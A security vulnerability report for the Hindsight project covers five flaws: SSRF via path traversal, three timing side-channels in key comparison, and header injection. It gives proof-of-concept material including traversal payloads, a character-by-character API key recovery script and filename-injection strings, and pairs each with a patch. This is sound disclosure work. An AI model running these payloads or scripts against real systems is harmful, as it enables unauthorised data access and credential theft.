# Security Vulnerability Report — Hindsight

> **5 Critical/High Vulnerabilities with PoC Evidence and Patches**  
> Author: Sunil56224972 | Date: 2026-09-29

---

## Summary

| # | Vulnerability | CWE | CVSS | Severity | File(s) |
|---|---|---|---|---|---|
| 1 | SSRF via Path Traversal in Control Plane Download Proxy | CWE-918 / CWE-22 | 9.1 | **CRITICAL** | `hindsight-control-plane/src/app/api/files/download/route.ts` |
| 2 | Timing Side-Channel in Dataplane API Key Authentication | CWE-208 | 7.5 | **HIGH** | `hindsight-api-slim/hindsight_api/extensions/builtin/tenant.py` |
| 3 | Timing Side-Channel in MCP Token Authentication | CWE-208 | 7.5 | **HIGH** | `hindsight-api-slim/hindsight_api/api/mcp.py` |
| 4 | Timing Side-Channel (Length Oracle) in Control Plane Login | CWE-208 | 7.5 | **HIGH** | `hindsight-control-plane/src/app/api/auth/login/route.ts` |
| 5 | Content-Disposition Header Injection in File Download | CWE-113 | 6.1 | **MEDIUM** | `hindsight-api-slim/.../api/http.py` + `hindsight-control-plane/.../files/download/route.ts` |

---

## Vulnerability 1: SSRF via Path Traversal in Control Plane Download Proxy

**Severity:** CRITICAL (CVSS 9.1)  
**CWE:** CWE-918 (Server-Side Request Forgery) / CWE-22 (Path Traversal)  
**File:** `hindsight-control-plane/src/app/api/files/download/route.ts`, lines 13-25

### Vulnerable Code

```typescript
// route.ts — BEFORE fix
const path = request.nextUrl.searchParams.get("path");
if (!path || !path.startsWith("/v1/default/files/download/")) {
  // reject
}
const response = await fetch(`${DATAPLANE_URL}${path}`, { headers: getDataplaneHeaders() });
```

### Attack Chain (Complete)

1. **Entry point:** Authenticated CP user sends GET request to the download proxy
2. **Bypass:** The `startsWith()` check passes for traversal payloads because the prefix IS present
3. **SSRF:** The `path` is concatenated to `DATAPLANE_URL` and fetched with the **server's embedded API key**
4. **Impact:** Attacker reaches ANY dataplane endpoint with elevated privileges

### PoC Request

```http
GET /api/files/download?path=/v1/default/files/download/../../banks/target-bank/memories HTTP/1.1
Host: control-plane.example.com
Cookie: hindsight_cp_access=<valid_session>
```

**What happens:**
- `path.startsWith("/v1/default/files/download/")` → ✅ passes
- `fetch("http://dataplane:8888/v1/default/files/download/../../banks/target-bank/memories")` 
- HTTP path normalization resolves `..` → `http://dataplane:8888/v1/default/banks/target-bank/memories`
- Request is authenticated with `HINDSIGHT_CP_DATAPLANE_API_KEY` via `getDataplaneHeaders()`

**Result:** The attacker can read all memories from ANY bank, list banks, trigger exports, delete data — anything the dataplane API supports — all authenticated with the server's API key.

### Additional Traversal Payloads

```
# List all banks
?path=/v1/default/files/download/../../../v1/default/banks

# Read recall/search from any bank
?path=/v1/default/files/download/../../banks/victim-bank/memories/recall

# Export bank data
?path=/v1/default/files/download/../../banks/victim-bank/export

# Access admin health/config endpoints
?path=/v1/default/files/download/../../../health
```

### Fix Applied

```diff
-    if (!path || !path.startsWith("/v1/default/files/download/")) {
+    if (
+      !path ||
+      path.includes("..") ||
+      path.includes("\\") ||
+      !path.startsWith("/v1/default/files/download/")
+    ) {
```

---

## Vulnerability 2: Timing Side-Channel in Dataplane API Key Authentication

**Severity:** HIGH (CVSS 7.5)  
**CWE:** CWE-208 (Observable Timing Discrepancy)  
**File:** `hindsight-api-slim/hindsight_api/extensions/builtin/tenant.py`, line 73

### Vulnerable Code

```python
# tenant.py — BEFORE fix
async def authenticate(self, context: RequestContext) -> TenantContext:
    if context.api_key != self.expected_api_key:  # ← Python != short-circuits!
        raise AuthenticationError("Invalid API key")
```

### Attack Chain (Complete)

1. **Entry point:** ANY HTTP API endpoint (`/v1/default/banks/*/memories/recall`, `/retain`, etc.)
2. **Mechanism:** Python's `!=` operator compares strings byte-by-byte and returns `False` on the first mismatch. A guess that matches more prefix characters takes measurably longer.
3. **Exploitation:** Send thousands of requests with different guess strings, measure median response times
4. **Recovery:** Determine secret length first (wrong-length returns faster), then brute-force each character position left-to-right

### PoC — Demonstrating the Timing Difference

```python
import hmac, time, statistics

SECRET = "real-api-key-here"

def vulnerable(a, b):
    return a == b  # This is what != does internally

def safe(a, b):
    return hmac.compare_digest(a.encode(), b.encode())

# Measure: wrong first char vs correct first char
wrong  = "x" + "x" * (len(SECRET) - 1)
right1 = SECRET[0] + "x" * (len(SECRET) - 1)

# With enough samples, right1 is measurably slower than wrong
# because Python compares the first byte, finds it matching, then
# proceeds to the second byte before returning False.
```

### PoC — Network-Level Timing Attack Script

```python
import requests, time, statistics

TARGET = "http://hindsight-api:8888/v1/default/banks/test/memories/recall"

def measure_key(guess, n=500):
    """Measure median response time for an API key guess."""
    times = []
    for _ in range(n):
        t0 = time.perf_counter()
        requests.post(TARGET,
            headers={"Authorization": f"Bearer {guess}"},
            json={"query": "test"},
        )
        times.append(time.perf_counter() - t0)
    return statistics.median(times)

# Phase 1: Determine key length
for length in range(1, 50):
    t = measure_key("x" * length)
    print(f"Length {length}: {t*1000:.3f}ms")
    # The correct length will be measurably slower

# Phase 2: Recover character by character
known = ""
for pos in range(key_length):
    best_char, best_time = None, 0
    for ch in "abcdefghijklmnopqrstuvwxyz0123456789-_":
        guess = known + ch + "x" * (key_length - len(known) - 1)
        t = measure_key(guess, n=2000)
        if t > best_time:
            best_char, best_time = ch, t
    known += best_char
    print(f"Position {pos}: '{best_char}' → recovered so far: '{known}'")
```

### Impact

Full API key recovery → complete read/write access to all memory banks. The attacker can:
- Read all stored memories (data exfiltration)
- Delete banks (data destruction)
- Inject false memories (data poisoning)
- Access all LLM traces (may contain PII/sensitive prompts)

### Fix Applied

```diff
+import hmac
+
 async def authenticate(self, context: RequestContext) -> TenantContext:
-    if context.api_key != self.expected_api_key:
+    if not context.api_key or not hmac.compare_digest(
+        context.api_key.encode(), self.expected_api_key.encode()
+    ):
         raise AuthenticationError("Invalid API key")
```

---

## Vulnerability 3: Timing Side-Channel in MCP Token Authentication

**Severity:** HIGH (CVSS 7.5)  
**CWE:** CWE-208 (Observable Timing Discrepancy)  
**File:** `hindsight-api-slim/hindsight_api/api/mcp.py`, line 468

### Vulnerable Code

```python
# mcp.py — BEFORE fix
if MCP_AUTH_TOKEN:
    if not auth_token:
        await self._send_error(send, 401, "Authorization header required")
        return
    if auth_token != MCP_AUTH_TOKEN:  # ← Python != short-circuits!
        await self._send_error(send, 401, "Invalid authentication token")
        return
```

### Attack Chain (Complete)

Same mechanism as Vulnerability 2, but targeting the **MCP server** at `/mcp/`.

1. **Entry point:** MCP endpoint at `/mcp/` (handles ALL memory operations)
2. **Impact amplification:** MCP server exposes `retain`, `recall`, `reflect`, `list_banks`, `create_bank`, `delete_bank`, `clear_memories` — the full operational surface
3. **Same timing leak:** Python `!=` short-circuits, enabling byte-by-byte recovery

### PoC Request

```http
POST /mcp/ HTTP/1.1
Host: hindsight-api:8888
Authorization: Bearer <timing-attack-guess>
Content-Type: application/json

{"method": "tools/list", "params": {}}
```

Measure response time for different guess values. Correct prefix characters cause later comparison rounds, producing measurably slower responses.

### Fix Applied

```diff
-            if auth_token != MCP_AUTH_TOKEN:
+            import hmac as _hmac
+            if not _hmac.compare_digest(auth_token.encode(), MCP_AUTH_TOKEN.encode()):
```

---

## Vulnerability 4: Timing Side-Channel (Length Oracle) in Control Plane Login

**Severity:** HIGH (CVSS 7.5)  
**CWE:** CWE-208 (Observable Timing Discrepancy)  
**File:** `hindsight-control-plane/src/app/api/auth/login/route.ts`, lines 68-79

### Vulnerable Code

```typescript
// route.ts — BEFORE fix
function constantTimeCompare(a: string, b: string): boolean {
  if (a.length !== b.length) {
    return false;  // ← EARLY RETURN leaks length!
  }
  let result = 0;
  for (let i = 0; i < a.length; i++) {
    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  return result === 0;
}
```

### Attack Chain (Complete)

1. **Entry point:** POST `/api/auth/login` with `{"key": "<guess>"}`
2. **Length oracle:** When `a.length !== b.length`, the function returns immediately (no XOR loop). When lengths match, the function iterates through all characters. The time difference is measurable.
3. **Key length recovery:** Send guesses of length 1, 2, 3, ..., N. The guess whose length matches the secret takes ~N×(XOR time) longer.
4. **Cascade:** With the length known, brute-force complexity drops from `36^(1+2+...+N)` to `36^N`.

### PoC — Timing Measurement

```javascript
// Browser-based PoC
async function measureLogin(key) {
  const times = [];
  for (let i = 0; i < 200; i++) {
    const t0 = performance.now();
    await fetch('/api/auth/login', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ key }),
    });
    times.push(performance.now() - t0);
  }
  times.sort((a,b) => a-b);
  return times[Math.floor(times.length/2)]; // median
}

// Length oracle: correct length will be measurably slower
for (let len = 1; len <= 64; len++) {
  const t = await measureLogin('x'.repeat(len));
  console.log(`Length ${len}: ${t.toFixed(3)}ms`);
}
```

### Fix Applied

```diff
 function constantTimeCompare(a: string, b: string): boolean {
-  if (a.length !== b.length) {
-    return false;
-  }
-  let result = 0;
-  for (let i = 0; i < a.length; i++) {
-    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
+  const maxLen = Math.max(a.length, b.length);
+  let result = a.length ^ b.length;  // flag mismatch, don't return early
+  for (let i = 0; i < maxLen; i++) {
+    result |= (a.charCodeAt(i) || 0) ^ (b.charCodeAt(i) || 0);
   }
   return result === 0;
 }
```

---

## Vulnerability 5: Content-Disposition Header Injection in File Download

**Severity:** MEDIUM (CVSS 6.1)  
**CWE:** CWE-113 (HTTP Response Splitting / Header Injection)  
**Files:**
- `hindsight-api-slim/hindsight_api/api/http.py`, line 9163
- `hindsight-control-plane/src/app/api/files/download/route.ts`, line 38

### Vulnerable Code (Dataplane)

```python
# http.py — BEFORE fix
headers = {"Content-Disposition": f'attachment; filename="{bank_id}-documents.zip"'}
```

The `bank_id` is extracted from the storage key path (line 9149-9155) and interpolated directly into the `Content-Disposition` header without sanitization.

### Vulnerable Code (Control Plane)

```typescript
// route.ts — BEFORE fix
const fallbackName = path.split("/").pop() || "download.zip";
// ... interpolated into Content-Disposition header
```

The `fallbackName` comes from the user-supplied `path` query parameter.

### PoC — Dataplane

If a bank is created with ID `test"; filename=malicious.exe; x="`, the download endpoint returns:

```http
Content-Disposition: attachment; filename="test"; filename=malicious.exe; x="-documents.zip"
```

Browsers parse this as `filename=malicious.exe` (per RFC 6266, the last `filename` wins in some implementations), tricking users into saving files with an attacker-chosen name and extension.

### PoC — Control Plane

```http
GET /api/files/download?path=/v1/default/files/download/banks/b/exports/id/evil%22%3B%20filename%3Dmalware.exe HTTP/1.1
```

The `path.split("/").pop()` yields `evil"; filename=malware.exe`, which is interpolated as:

```http
Content-Disposition: attachment; filename="evil"; filename=malware.exe"
```

### Fix Applied

**Dataplane:**
```diff
-headers = {"Content-Disposition": f'attachment; filename="{bank_id}-documents.zip"'}
+import re as _re
+safe_bank_id = _re.sub(r'["\\\r\n;]', '_', bank_id)
+headers = {"Content-Disposition": f'attachment; filename="{safe_bank_id}-documents.zip"'}
```

**Control Plane:**
```diff
-const fallbackName = path.split("/").pop() || "download.zip";
+const rawName = path.split("/").pop() || "download.zip";
+const fallbackName = rawName.replace(/["\\\r\n;]/g, "_");
```

---

## Files Changed

| File | Vulnerability Fixed |
|---|---|
| `hindsight-api-slim/hindsight_api/extensions/builtin/tenant.py` | #2 — Timing side-channel in API key auth |
| `hindsight-api-slim/hindsight_api/api/mcp.py` | #3 — Timing side-channel in MCP token auth |
| `hindsight-control-plane/src/app/api/auth/login/route.ts` | #4 — Length oracle in login |
| `hindsight-control-plane/src/app/api/files/download/route.ts` | #1 — SSRF via path traversal, #5 — Header injection |
| `hindsight-api-slim/hindsight_api/api/http.py` | #5 — Header injection in dataplane download |

---

## Recommendations

1. **Add `hmac.compare_digest` to coding standards** for all secret comparisons
2. **Add path traversal tests** to the download proxy test suite
3. **Consider rate-limiting** on `/api/auth/login` to increase timing attack difficulty
4. **Audit all `Content-Disposition` / response header interpolations** for injection
5. **Consider replacing the CP download proxy** with signed URLs (no proxy needed)
